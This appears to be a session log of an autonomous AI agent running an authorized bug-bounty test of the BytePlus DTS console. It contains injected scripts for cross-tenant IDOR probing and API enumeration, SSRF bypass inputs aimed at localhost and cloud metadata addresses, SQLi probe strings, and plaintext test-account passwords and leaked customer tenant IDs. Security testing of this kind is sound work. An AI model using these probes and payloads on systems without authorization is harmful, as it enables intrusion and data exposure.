+2760:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),15000);\n  try{const r=await fetch('/api/top/dts/GetSecurityToken/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({Type:'SecurityTokenOfBinlogInTOS'}),signal:ctl.signal});const t=await r.text();return {status:r.status,body:t.slice(0,1200)};}catch(e){return {err:String(e)}}finally{clearTimeout(to)}\n}","waitForStableDom":false}
+3020:- **Data-source BOLA/IDOR = NEGATIVE (scoped correctly):**
+3037:- **GetSecurityToken:** param `{Type:"SecurityTokenOfBinlogInTOS"}` (enum only `SecurityTokenOfNone`, `SecurityTokenOfBinlogInTOS`); used in chunk 9864 for TOS binlog upload (`accessKeyId`/`accessKeySecret`/`stsToken`/`Info.BucketName`). Calling as A or B hangs/times out — not usable.
+3053:- Reconstructing `CreateTransmissionTask` payload (`SrcConfig`/`DestConfig`/`SolutionSettings`) from chunk 6326 (`E.IV`, `E.XF`) or public docs to create a stopped test task in B, then test `DescribeTransmissionTaskInfo`/`DescribeTransmissionTaskProgress`/`GetTaskErrorInterpretation` from A for BOLA; delete test task after.
+3057:- No TaskId available yet to test task-detail BOLA; account A cannot create tasks (no DTS role), B can but schema not yet reconstructed.
+3066:3. Reconstruct `CreateTransmissionTask` nested schema from `/tmp/dtsjs/chunks/6326.c2c15716.js` (`E.IV`/`E.XF`) or public docs; create one stopped test task in B with `192.0.2.1` DS pair; then test task-detail endpoints from A for cross-tenant BOLA; delete task after.
+3083:- `vulnebleti/`: vuln knowledge notes (ATO, BAC, IDOR, SSRF, SQLi, cache, etc.).
+3331:- Test IDOR/BOLA, authentication and authorization boundaries, tenant
+3355:CSTI, IDOR, broken access control (BAC), and client-side open redirect that
+3379:Type: XSS | CSTI | IDOR | BAC | Open Redirect
+5111:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const keys=['AccountId','AccountID','OwnerId','OwnerAccountId','UserId','TenantId','TenantID','FilterAccountId','ResourceOwner','Account'];\n  const out=[];\n  for(const k of keys){\n    const body={PageNum:1,PageSize:50,[k]:'3001021825'};\n    const r=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    const t=await r.text(); const count=(t.match(/\"Count\":(\\d+)/)||[])[1]; const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n    out.push({k,code,count,cross:t.includes('2116046640132395013')||t.includes('aaitest-ds-b')});\n  }\n  return out;\n}","waitForStableDom":false}
+5115:OfBinlogInTOS'},{Type:'SecurityTokenOfNone'},{Type:'SecurityTokenOfBinlogInTOS',AccountId:'3001021825'},{Type:'SecurityTokenOfBinlogInTOS',TenantId:'3001021825'}]){const
+5116:SSL:false}},Category:'MySQL',Name:'aaitest-ma-b-20261030',TenantId:'3000823185',AccountId:'3000823185',Owner:'3000823185',ProjectName:'default',Tags:[{Key:'aaitest',Valu
+[0m
+[0m$ [0msed -n '2980,3075p' result/logs/opencode.log | sed 's/\x1b\[[0-9;]*m//g'
+ListTaskType
+ListTaskValidationResult
+ListTrigger
+ListType
+ListVPC
+ListVPCSubnets
+ListView
+PreviewDFlowKV
+SearchDataSourceTablesAsync
+
+⚙ chrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const acts=`CheckDataSourceConnection CheckDataSourceSqlsValid CheckTaskQuota DescribeAlertInfos DescribeAlertRule DescribeAllClusters DescribeBusinessInfo DescribeDFlowList DescribeDataMigrationTasks DescribeDataSource DescribeDataSourceType DescribeDataSubscriptionTasks DescribeDataSynchronizationFullProgress DescribeDataSynchronizationIncrProgress DescribeDataSynchronizationMetaProgress DescribeDataSynchronizationObjects DescribeDataSynchronizationTask DescribeDataSynchronizationTasks DescribeDataValidationResult DescribeDataValidationTasks DescribeDiagnoses DescribeESClusterMetaInfo DescribeGateways DescribeInstancePrice DescribeInstanceSpecs DescribeMQTopicInfo DescribeMQTopics DescribeMSSQLBackups DescribeMSSQLRecoverDbs DescribeMetaMapping DescribeMongoInstanceRelatedSolutions DescribeMonitorInfos DescribePreCheckInfo DescribePriceDifferences DescribeReconciliationData DescribeScheduleCluster DescribeShardInfo DescribeSqlReplayDigestDetailSamples DescribeSqlReplayDigestErrorSamples DescribeSqlReplayDigestParseFailSamples DescribeSqlReplayResult DescribeSubscriptionGroup DescribeSubscriptionGroupProgress DescribeSubscriptionGroups DescribeSupportedValidationTypes DescribeTables DescribeTagsByResource DescribeTaskEvents DescribeTaskPrice DescribeTaskValidationResult DescribeTasks DescribeTasksByDBName DescribeTransmissionTaskInfo DescribeTransmissionTaskProgress DescribeTransmissionTasks DescribeTransmissionTasksByInstanceId DescribeValidationTaskInfo DescribeValidationTaskResult DescribeValidationTasks GetAsyncChangeMongoShardTopoResult GetAsyncCheckConnectionResult GetAsyncPreCheckResult GetBetaQualification GetCorrectionResultDownloadLink GetCorrectionResultForDisplay GetCrossRegionEndpoint GetDBFullRateLimit GetDBTableDiffDetails GetDataMigration GetDataSourceTablesSearchResult GetDataSubscription GetDataVerification GetFeatures GetLatestPreCheckId GetMetricsInfo GetMetricsPodStatistics GetObject GetRedisChannelInfo GetSchedulePolicy GetSecurityToken GetSubscriptionGroup GetSubscriptionGroupProgress GetSyncPosition GetTaskErrorInterpretation GetTaskMetricsInfo GetTaskWeekSummary GetTrafficSpec GetUserWeekSummary ListAccount ListAggregate ListDB ListDFlowKV ListDataMigration ListDataSource ListDataSourceAccounts ListDataSourceAggregates ListDataSourceColumns ListDataSourceDbs ListDataSourceDomains ListDataSourceEvents ListDataSourceExtensions ListDataSourceFiles ListDataSourceFunctions ListDataSourceInstanceNodes ListDataSourceInstances ListDataSourceOperators ListDataSourceProcedures ListDataSourceRules ListDataSourceSequences ListDataSourceTables ListDataSourceTriggers ListDataSourceType ListDataSourceTypes ListDataSourceViews ListDataSubscription ListDataVerification ListDomain ListEgressIP ListEgressIps ListEvent ListEvents ListExtension ListFunction ListMgrCustomerParam ListMgrParam ListOperator ListProcedure ListRedisCheckJob ListRedisCheckJobDetail ListRegion ListRule ListSequence ListSubscriptionDataSourceType ListSubscriptionGroup ListTable ListTaskEvents ListTaskType ListTaskValidationResult ListTrigger ListType ListVPC ListVPCSubnets ListView PreviewDFlowKV SearchDataSourceTablesAsync`.split(/\\s+/);\n  const results=[];\n  const worker=async(a)=>{const ctl=new AbortController();const to=setTimeout(()=>ctl.abort(),4000);try{const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:'{}',signal:ctl.signal});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';if(code!=='InvalidActionOrVersion')results.push({a,code,snip:t.slice(0,260)});}catch(e){results.push({a,code:'TIMEOUT_OR_ERR'})}finally{clearTimeout(to)}};\n  let i=0; const runners=Array.from({length:8},async()=>{while(i<acts.length){const a=acts[i++];await worker(a);}}); await Promise.all(runners);\n  return {total:acts.length,registered:results.length,results};\n}","waitForStableDom":false}
+◈ Exa Web Search "BytePlus DTS CreateTransmissionTask API SrcConfig DestConfig SolutionSettings"
+% WebFetch https://docs.byteplus.com/en/docs/DTS/createtransmissiontask
+⚙ chrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const acts=`CheckDataSourceConnection CheckDataSourceSqlsValid CheckTaskQuota DescribeAlertInfos DescribeAlertRule DescribeAllClusters DescribeBusinessInfo DescribeDFlowList DescribeDataMigrationTasks DescribeDataSource DescribeDataSourceType DescribeDataSubscriptionTasks DescribeDataSynchronizationFullProgress DescribeDataSynchronizationIncrProgress DescribeDataSynchronizationMetaProgress DescribeDataSynchronizationObjects DescribeDataSynchronizationTask DescribeDataSynchronizationTasks DescribeDataValidationResult DescribeDataValidationTasks DescribeDiagnoses DescribeESClusterMetaInfo DescribeGateways DescribeInstancePrice DescribeInstanceSpecs DescribeMQTopicInfo DescribeMQTopics DescribeMSSQLBackups DescribeMSSQLRecoverDbs DescribeMetaMapping DescribeMongoInstanceRelatedSolutions DescribeMonitorInfos DescribePreCheckInfo DescribePriceDifferences DescribeReconciliationData DescribeScheduleCluster DescribeShardInfo DescribeSqlReplayDigestDetailSamples DescribeSqlReplayDigestErrorSamples DescribeSqlReplayDigestParseFailSamples DescribeSqlReplayResult DescribeSubscriptionGroup DescribeSubscriptionGroupProgress DescribeSubscriptionGroups DescribeSupportedValidationTypes DescribeTables DescribeTagsByResource DescribeTaskEvents DescribeTaskPrice DescribeTaskValidationResult DescribeTasks DescribeTasksByDBName DescribeTransmissionTaskInfo DescribeTransmissionTaskProgress DescribeTransmissionTasks DescribeTransmissionTasksByInstanceId DescribeValidationTaskInfo DescribeValidationTaskResult DescribeValidationTasks GetAsyncChangeMongoShardTopoResult GetAsyncCheckConnectionResult GetAsyncPreCheckResult GetBetaQualification GetCorrectionResultDownloadLink GetCorrectionResultForDisplay GetCrossRegionEndpoint GetDBFullRateLimit GetDBTableDiffDetails GetDataMigration GetDataSourceTablesSearchResult GetDataSubscription GetDataVerification GetFeatures GetLatestPreCheckId GetMetricsInfo GetMetricsPodStatistics GetObject GetRedisChannelInfo GetSchedulePolicy GetSubscriptionGroup GetSubscriptionGroupProgress GetSyncPosition GetTaskErrorInterpretation GetTaskMetricsInfo GetTaskWeekSummary GetTrafficSpec GetUserWeekSummary ListAccount ListAggregate ListDB ListDFlowKV ListDataMigration ListDataSource ListDataSourceAccounts ListDataSourceAggregates ListDataSourceColumns ListDataSourceDbs ListDataSourceDomains ListDataSourceEvents ListDataSourceExtensions ListDataSourceFiles ListDataSourceFunctions ListDataSourceInstanceNodes ListDataSourceInstances ListDataSourceOperators ListDataSourceProcedures ListDataSourceRules ListDataSourceSequences ListDataSourceTables ListDataSourceTriggers ListDataSourceType ListDataSourceTypes ListDataSourceViews ListDataSubscription ListDataVerification ListDomain ListEgressIP ListEgressIps ListEvent ListEvents ListExtension ListFunction ListMgrParam ListOperator ListProcedure ListRedisCheckJob ListRedisCheckJobDetail ListRegion ListRule ListSequence ListSubscriptionDataSourceType ListSubscriptionGroup ListTable ListTaskEvents ListTaskType ListTaskValidationResult ListTrigger ListType ListVPC ListVPCSubnets ListView PreviewDFlowKV SearchDataSourceTablesAsync`.split(/\\s+/);\n  const results=[];\n  const worker=async(a)=>{const ctl=new AbortController();const to=setTimeout(()=>ctl.abort(),4000);try{const r=await fetch(`/api/top/dts/${a}/2018-01-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:'{}',signal:ctl.signal});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';if(code!=='InvalidActionOrVersion')results.push({a,code,snip:t.slice(0,240)});}catch(e){}finally{clearTimeout(to)}};\n  let i=0; const runners=Array.from({length:8},async()=>{while(i<acts.length){const a=acts[i++];await worker(a);}}); await Promise.all(runners);\n  return {total:acts.length,registered:results.length,results};\n}","waitForStableDom":false}
+## Objective
+- Autonomously hunt for valid, reproducible, high-impact vulnerabilities in the authorized BytePlus DTS console target, following `skills/AGENT.md` exactly, and report confirmed findings under `result/`.
+
+## Important Details
+- Repo root: `/home/runner/work/aaii-aautomattionn/aaii-aautomattionn`; run started `2026-10-30T08:55:26Z`.
+- Authorized target from `data/targets.txt`: `https://console.byteplus.com/dts/region:dts+ap-southeast-1/`; test all sub-routes under `/dts/*`; private BBP, `console.byteplus.com` in scope.
+- `data/targets.txt` instructs Discord webhook on confirmed vuln. Decision: do **not** call webhook directly (external side effect / evidence-exfil risk); write findings to `result/confirmed-vuln.txt`, CI forwards. Documented in `result/scope.md`.
+- Credentials (disposable/public):
+  - Account A: `adoringjepsen1@fearlessmails.com` / `Acd3423@#345566` — AccountID `3000823185`, user `test-user-123`.
+  - Account B: `testt456` / `Acd3423@#345` — AccountID `3001021825`. Logged in on page 2 with `isolatedContext=userB`.
+- Environment: Chrome `156.0.8078.73`; DevTools endpoint `http://127.0.0.1:9222`; `chrome-devtools` MCP; node v22.23.4; curl/jq/python3; **no ripgrep (`rg`)** — use grep/python.
+- API pattern: `POST https://console.byteplus.com/api/top/dts/{Action}/{Version}/{region}`; JSON body; CSRF double-submit via `csrfToken` cookie + `x-csrf-token` header; also `x-storage-request-source: Web`, `x-storage-language: en`, `x-dts-accept-language: en`, `content-type: application/json; charset=UTF-8`.
+- Auth verified: no CSRF → HTTP 200 `InvalidCSRFToken`; CSRF pair w/o session → HTTP 401 `NotLogin`.
+- Account A is empty (no DTS resources) and lacks DTS service role: Create data source redirects to IAM attach_role (out of scope, not tested). A can still call many APIs.
+- Account B has DTS service role. Test data sources in B:
+  - DS1: `2116046640132395013`, name now `aaitest-ds-b-renamed`, `Public_MySQL`, host `192.0.2.1:3306` (TEST-NET-1 non-routable), user `aaitest`, pass `aaitestpass`.
+  - DS2: `2115010358560165895`, name `aaitest-ma-b-20261030`, same host/creds, created with mass-assignment extras (`TenantId`/`AccountId`/`Owner`=`3000823185`, `ProjectName`, `Tags`) — extras ignored/not persisted.
+- Route inventory: `/dts`, `/datasource`, `/datasynchronizationv2` (+detail), `/datasubscriptionv2` (+detail), `/datavalidation` (+detail), `/tasksearch` (+`/detail/:id`), `/datamigrationv2/detail(/:id)`, `/overview`, `/createV2`, `/dflow`, `/etl-playground`, `/event`, `/modifyOrder`, `/params`, `/redirect`, `/subscriptiontasksearch`, `/synchronizationtasksearch`, `/assessment/detail`, `/datareplay/detail`.
+- Safety constraints: stay on `/dts/*` same-origin; no destructive/DoS/brute force; no real-user data; no costly task creation (creating stopped test task in B is acceptable if needed); no IAM/third-party/internal probing; SSRF to metadata blocked by app anyway.
+
+## Work State
+### Completed
+- Read `skills/AGENT.md`, `skills/client-side-skill.md`, `skills/server-side-skill.md`; preflight + scope validation done (not blocked).
+- Wrote `result/logs/session.md`, `result/scope.md`; created `result/client-side`, `result/server-side`, `result/findings`, `result/inventory`, `result/logs`.
+- Logged in both accounts; verified distinct tenants (A `3000823185`, B `3001021825`).
+- Extracted 480 DTS actions; 145 read-verb actions.
+- **Data-source BOLA/IDOR = NEGATIVE (scoped correctly):**
+  - A `DescribeDataSource` w/ B's ID → `Result {}`; `ListDataSource` w/ `Identifier` → `Count:0`; with `AccountId`/`AccountID`/`TenantId`/`TenantID`/`TenantIDList`/`AllTenant`/`IsAdmin` → still `Count:0`.
+  - A `ModifyDataSource` w/ B's ID + minimal body → `InternalError`; B's object unchanged.
+  - A `DeleteDataSource` w/ B's ID → HTTP 200 `Result {}` but B's object still exists minutes later (silent no-op for non-owner).
+  - Captured real `ModifyDataSource` (reqid 1406) by renaming B's DS via UI → rename succeeded (`ModifyTime:1793351406208`). Replayed valid full payload from A → `InternalError`, B unchanged. Cross-tenant write properly blocked.
+  - Modify payload shape: `{DataSourceId:id, DataSource:{EndpointType:'Public_MySQL', PublicMySQLSettings:{RegionSettings:{Region:'ap-southeast-1'},Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',SSLSettings:{EnableSSL:false}}, DataSourceId:id, Category:'MySQL', Name:'...'}}`.
+- Captured exact `CreateDataSource` request (reqid 812, content-length 276) from preserved network logs.
+- Mass assignment via `CreateDataSource` extras: NEGATIVE.
+- **SSRF via `CheckDataSourceConnection` = NEGATIVE (private/reserved blocked):** body shape `{DataSource, AsyncCheck}` (from chunk 6326).
+  - `127.0.0.1:3306`, `169.254.169.254:80`, `127.0.0.1.nip.io`, `localtest.me`, `[::1]`, `2130706433`, `0x7f000001`, `127.1`, `0` → quick `InvalidNetworkAddress.Unavaiable` ("The specified ip is unvailable.").
+  - `1.1.1.1:3306` → allowed attempt, hung >15s. Private-range validation works.
+- **CORS:** preflight returns fixed `access-control-allow-origin: http://console.byteplus.com` (http, not https) for Origin `https://evil.example`, `https://console.byteplus.com`, `null`; `allow-credentials:true`; `allow-methods: GET,HEAD,PUT,POST,DELETE`; `allow-headers: content-type,x-csrf-token`. Not arbitrary-origin reflective; http origin 301→https; no HSTS on `/` or `/home`. Only MITM-grade, weak — not reported.
+- **SQLi quick probes on `ListDataSource` = NEGATIVE:** `OrderBy:"OrderByCreateTimeDesc'"`, `"..., (select 1)"`, `Name` quote, `Identifier` quote, `SearchKey:"'"`, `Keyword:"'"` all returned normal `OK`/`Count 2` or `Count 0`, no SQL errors.
+- **Hidden ops routes `/params`, `/dflow`:** direct nav as A → console-level 404 (DTS micro-app doesn't mount hidden routes). Not exploitable.
+- **`/redirect` (chunk `t_Redirect.edb37062.js`):** only internal `history.push('/createv2?...')` based on `scene` (`createDRS`/`createBGS`/`createMultiActive`), or with `taskId` calls `DescribeTransmissionTaskInfo` then pushes `${p.C[TaskType]}/${taskId}`. No open redirect.
+- **Internal action enumeration:** probed all 145 read actions at `2022-10-01` on A (concurrency 8, empty body); 63 registered (non-`InvalidActionOrVersion`). Notable: `CheckTaskQuota` OK `{Enough:true,QuotaValue:10000,Usage:0}`; `DescribeDataSourceType` OK (large item list); `DescribeDataSource` empty body → `MgrParamInvalid` 参数非法; `CheckDataSourceSqlsValid` → `InternalError`; `DescribeESClusterMetaInfo` → `MissingParameter`; `DescribeTasks` → Total 0; `DescribeValidationTasks` → `Result {}`; `DescribeTagsByResource` → `{}`.
+- **Ops action versions:** chunk 606 defines `Ai="2018-01-01"` actions: `ListMgrParam`, `GetObject`, `OperateObject`, `GetMetricsInfo`, `GetTaskMetricsInfo`, `GetMetricsPodStatistics`, `CreateUpgradeJob`, `UpdateCloudMonitor`, `DescribeTasksByDBName`, `DescribeAllClusters`, `ProjectEventCallback` — all tested at 2018/2022 → `InvalidActionOrVersion`; only `ListMgrCustomerParam` registered at 2018.
+- **GetSecurityToken:** param `{Type:"SecurityTokenOfBinlogInTOS"}` (enum only `SecurityTokenOfNone`, `SecurityTokenOfBinlogInTOS`); used in chunk 9864 for TOS binlog upload (`accessKeyId`/`accessKeySecret`/`stsToken`/`Info.BucketName`). Calling as A or B hangs/times out — not usable.
+- **Task creation probing:** `CreateTransmissionTask` needs `SrcConfig` → `DestConfig` (key is `DestConfig`, not `DstConfig`) → `SolutionSettings`; with all empty → `InternalError` no detail. `CreateValidationTask` needs `SolutionSettings`→`SrcConfig`→`DestConfig`→`InternalError`. `CreateDataValidationTask`/`CreateDataSynchronizationTask`/`CreateDataSubscription` → `InvalidActionOrVersion` at 2022-10-01. No tasks created; B `DescribeTransmissionTasks` still `Result {}`; `ListDataValidation`/`ListValidationTask`/`ListDataVerification`/`ListDataReplay` at 2022-10-01 → `InvalidActionOrVersion`.
+- `GetFeatures/2018-01-01` full response is normal config: `ByteMQServerRoomList`, `ByteRedisLocations`, `BytedanceServerRooms`, `BytedocServerRooms`, `DTSAuthPSM:[{Env:"cn",PSM:"bytedts.dflow.auth"},...]`, flags `EnableCrossAccount:true`, `EnableCrossRegionDatasource:true`, etc.
+
+### Active
+- **Candidate finding (unreported):** `POST /api/top/dts/ListMgrCustomerParam/2018-01-01/ap-southeast-1` with body `{}` returns HTTP 200 and global internal tenant whitelist config to any authenticated customer session (tested as A, which has no DTS role). Response ~1983 bytes, includes:
+  - `EnableMongoSubTenantWhiteList:["*"]`, `EnableMSSQLTenantWhiteList:["*"]`
+  - `EnableRDSShardingTenantWhiteList:["1600000106","3000006772","1600000101","3000001999","2100222151","2100584669","2100222152","1600000105","2100365179","2100365181"]`
+  - `EnableByteESTenantIDList:["1600000101"]`
+  - `EnableUsingCustomByteDanceMQTenantWhiteList:["*"]`
+  - `EnableUsingCustomInnerByteDanceMQTenantWhiteList:["2100365179"]`
+  - `EnableUsingCustomByteDanceRMQTenantWhiteList:["2100365179","3000619337"]`
+  - `EnableSubscriptionVolcShardingWhiteList:[...]`, `EnableSyncRDSShardingTenantW...` (truncated at 1983 bytes)
+  - Not used by frontend JS; only read action; no `UpdateMgrCustomerParam` in enum. Unauthenticated blocked (InvalidCSRFToken / NotLogin).
+  - Severity assessment pending: internal config + customer tenant IDs = low/medium info disclosure.
+- Triage of the 63 registered read actions' full responses (output truncated; need re-fetch/select) for other internal/ops leaks or unscoped identifiers.
+- Reconstructing `CreateTransmissionTask` payload (`SrcConfig`/`DestConfig`/`SolutionSettings`) from chunk 6326 (`E.IV`, `E.XF`) or public docs to create a stopped test task in B, then test `DescribeTransmissionTaskInfo`/`DescribeTransmissionTaskProgress`/`GetTaskErrorInterpretation` from A for BOLA; delete test task after.
+- Stored XSS via data source/task `Name` not yet tested.
+
+### Blocked
+- No TaskId available yet to test task-detail BOLA; account A cannot create tasks (no DTS role), B can but schema not yet reconstructed.
+- `CreateTransmissionTask`/`CreateValidationTask` return opaque `InternalError` after required top-level params provided — need exact nested config schema.
+- Public docs `https://docs.byteplus.com/en/docs/DTS/createtransmissiontask` are JS-rendered; `webfetch` returned only SPA shell, no schema.
+- `GetSecurityToken` hangs (backend dependency timeout) — not usable.
+- Some ops actions (`ListMgrParam`, `GetObject`, `Deploy`, `InnerListTradeInstance`, etc.) not registered at tested versions (2018/2019/2020/2021/2022/2023/2024/2025).
+
+## Next Move
+1. Decide/report the `ListMgrCustomerParam` authenticated internal-config disclosure: write finding JSON/MD under `result/server-side/` and `result/findings/`, update `result/confirmed-vuln.txt` in AGENT.md format (CI forwards to Discord; do not call webhook).
+2. Re-run the 63-registered read actions in smaller batches on both A and B, capture full responses, and triage for internal config/secrets or identifiers not scoped to caller (focus `ListDataSourceAccounts`, `DescribeTasksByDBName`, `DescribeAllClusters`, `DescribeAlertInfos`, `ListEgressIP`, `GetCrossRegionEndpoint`).
+3. Reconstruct `CreateTransmissionTask` nested schema from `/tmp/dtsjs/chunks/6326.c2c15716.js` (`E.IV`/`E.XF`) or public docs; create one stopped test task in B with `192.0.2.1` DS pair; then test task-detail endpoints from A for cross-tenant BOLA; delete task after.
+4. If task path yields nothing, test stored XSS via data source/task `Name` render, then update `result/logs/session.md`.
+
+## Relevant Files
+- `skills/AGENT.md`: workflow, safety rules, report format.
+- `skills/client-side-skill.md`, `skills/server-side-skill.md`: methodology.
+- `data/targets.txt`: authorized scope + Discord webhook note.
+- `creds/test-account.txt`: both test accounts.
+- `result/scope.md`: scope/authorization decision.
+- `result/logs/session.md`: session metadata (update with new progress).
+[0m
+[0m$ [0mls -la /tmp/dtsjs 2>/dev/null | head; du -sh /tmp/dtsjs 2>/dev/null; ls /tmp/dtsjs/chunks 2>/dev/null | head
+(no output)
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"() => ({url:location.href, scripts:[...document.scripts].map(s=>s.src).filter(Boolean), links:[...document.querySelectorAll('link[href]')].map(l=>l.href).filter(h=>h.includes('.js')).slice(0,20)})","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const tests=[['ListAccount','2022-10-01'],['ListAccount','2018-01-01'],['ListDataSourceAccounts','2022-10-01'],['DescribeAllClusters','2018-01-01'],['DescribeGateways','2022-10-01'],['ListEgressIP','2022-10-01'],['ListEgressIps','2022-10-01'],['DescribeBusinessInfo','2022-10-01'],['DescribeScheduleCluster','2022-10-01'],['GetCrossRegionEndpoint','2022-10-01'],['ListRegion','2022-10-01'],['ListTaskType','2022-10-01'],['DescribeTasks','2022-10-01'],['DescribeValidationTasks','2022-10-01'],['DescribeDataMigrationTasks','2022-10-01'],['ListDataSubscription','2022-10-01'],['ListDataVerification','2022-10-01']];\n  const out=[];\n  for(const [a,ver] of tests){\n    try{const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:'{}'});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';out.push({a,ver,code,len:t.length,snip:code==='OK'?t.slice(0,700):''});}catch(e){out.push({a,ver,err:String(e)})}\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"() => { const urls=new Set(); performance.getEntriesByType('resource').forEach(e=>{ if(/\\.js(\\?|$)/.test(e.name)) urls.add(e.name); }); return [...urls]; }","waitForStableDom":false}
+[0m
+[0m$ [0mmkdir -p /tmp/dtsjs && cd /tmp/dtsjs && cat > urls.txt <<'EOF'
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/index.b73cff3d.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/606.1e5e1456.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/1885.ac1e5208.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/9864.44fa83f1.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/4741.0a1aa325.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/6326.c2c15716.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/6600.6203c101.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/6137.2e8ae536.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/1741.f713a0d4.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/2382.bc8c653e.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/8650.2ffc0d60.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/3889.2d6dbdc4.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/7667.ae053c18.js
+https://res.gcloudcache.com/bp-fe/console-db/bp-db-dts/static/js/t_ListDataMigration.fea382f2.js
+EOF
+xargs -n1 -P8 curl -sS -m 25 -O < urls.txt; ls -la; du -sh .
+total 1492
+drwxr-xr-x  2 runner runner   4096 Oct 30 09:35 .
+drwxrwxrwt 26 root   root     4096 Oct 30 09:35 ..
+-rw-r--r--  1 runner runner  21748 Oct 30 09:35 1741.f713a0d4.js
+-rw-r--r--  1 runner runner  51128 Oct 30 09:35 1885.ac1e5208.js
+-rw-r--r--  1 runner runner  16737 Oct 30 09:35 2382.bc8c653e.js
+-rw-r--r--  1 runner runner  17753 Oct 30 09:35 3889.2d6dbdc4.js
+-rw-r--r--  1 runner runner  11843 Oct 30 09:35 4741.0a1aa325.js
+-rw-r--r--  1 runner runner  49991 Oct 30 09:35 606.1e5e1456.js
+-rw-r--r--  1 runner runner  22822 Oct 30 09:35 6137.2e8ae536.js
+-rw-r--r--  1 runner runner 510867 Oct 30 09:35 6326.c2c15716.js
+-rw-r--r--  1 runner runner  44698 Oct 30 09:35 6600.6203c101.js
+-rw-r--r--  1 runner runner  30891 Oct 30 09:35 7667.ae053c18.js
+-rw-r--r--  1 runner runner  20594 Oct 30 09:35 8650.2ffc0d60.js
+-rw-r--r--  1 runner runner 176050 Oct 30 09:35 9864.44fa83f1.js
+-rw-r--r--  1 runner runner 508314 Oct 30 09:35 index.b73cff3d.js
+-rw-r--r--  1 runner runner   3237 Oct 30 09:35 t_ListDataMigration.fea382f2.js
+-rw-r--r--  1 runner runner   1163 Oct 30 09:35 urls.txt
+1.5M	.
+[0m
+[0m$ [0mcd /tmp/dtsjs && for pat in 'dangerouslySetInnerHTML' 'innerHTML' 'insertAdjacentHTML' 'document.write' 'new Function' 'eval(' 'location.href' 'location.assign' 'location.replace' 'window.open' 'postMessage' 'URLSearchParams' 'location.search' 'location.hash' 'document.referrer'; do echo "=== $pat ==="; grep -lF "$pat" *.js 2>/dev/null | tr '\n' ' '; echo; done
+=== dangerouslySetInnerHTML ===
+
+=== innerHTML ===
+
+=== insertAdjacentHTML ===
+
+=== document.write ===
+
+=== new Function ===
+index.b73cff3d.js 
+=== eval( ===
+
+=== location.href ===
+2382.bc8c653e.js 
+=== location.assign ===
+
+=== location.replace ===
+
+=== window.open ===
+6326.c2c15716.js 6600.6203c101.js 
+=== postMessage ===
+
+=== URLSearchParams ===
+6326.c2c15716.js 
+=== location.search ===
+2382.bc8c653e.js 6326.c2c15716.js 
+=== location.hash ===
+
+=== document.referrer ===
+[0m
